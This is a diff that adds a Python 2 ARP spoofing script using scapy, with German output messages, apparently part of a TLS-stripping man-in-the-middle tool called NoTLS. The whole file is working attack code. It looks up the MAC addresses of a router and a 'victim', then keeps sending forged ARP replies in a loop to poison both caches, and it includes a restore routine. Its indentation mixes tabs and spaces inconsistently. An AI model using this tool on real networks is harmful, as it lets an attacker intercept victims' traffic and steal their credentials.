@@ -1,0 +1,51 @@
+#!/usr/bin/python
+
+import signal
+import sys
+import logging
+import time
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import send, srp, Ether, ARP
+def signalHandler(signal,frame):
+    print "\nCTRL-C wurde gedrueckt. Terminiere..."
+    sys.exit()
+
+signal.signal(signal.SIGINT,signalHandler);
+
+class Arpspoof(object):
+	def __init__(self, routerIP, victimIP, time):
+	    self._routerIP = routerIP
+	    self._routerMAC = ''
+	    self._victimIP = victimIP
+	    self._victimMAC = ''
+	    self._time = time
+
+	@staticmethod
+        def getMAC(ip):
+	    print 'Hole Mac von: %s'%ip
+	    alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), verbose=0, retry=2,timeout=2)
+	    for s,r in alive:
+		return r[Ether].src
+
+	def arpspoof(self):
+	    print "Sende ARPSPOOF: RouterIP:%s,RouterMAC:%s, OpferIP:%s,OpferMAC:%s"%(self._routerIP,self._routerMAC,self._victimIP,self._victimMAC)
+	    send(ARP(op="is-at", pdst=self._victimIP, psrc=self._routerIP, hwdst=self._victimMAC),verbose=0)
+	    send(ARP(op="is-at", pdst=self._routerIP, psrc=self._victimIP, hwdst=self._routerMAC),verbose=0)
+
+	def restore(self):
+	    send(ARP(op="is-at", pdst=self._routerIP, psrc=self._victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self._victimMAC), count=3)
+	    send(ARP(op="is-at", pdst=self._victimIP, psrc=self._routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self._routerMAC), count=3)
+
+	def startspoofing(self):
+	    self._routerMAC = self.getMAC(self._routerIP)
+	    self._victimMAC = self.getMAC(self._victimIP)
+	    if self._victimMAC == None:
+		sys.exit("Konnte die Victim MAC nicht finden. NoTLS wird geschlossen...")
+	    if self._routerMAC == None:
+		sys.exit("Konnte die Router MAC nicht finden. NoTLS wird geschlossen...")
+	    
+	    print 'MAC Adresse des Routers: %s' % self._routerMAC
+	    print 'MAC Adresse des Opfers: %s' % self._victimMAC    
+	    while 1:
+		self.arpspoof()
+		time.sleep(self._time)
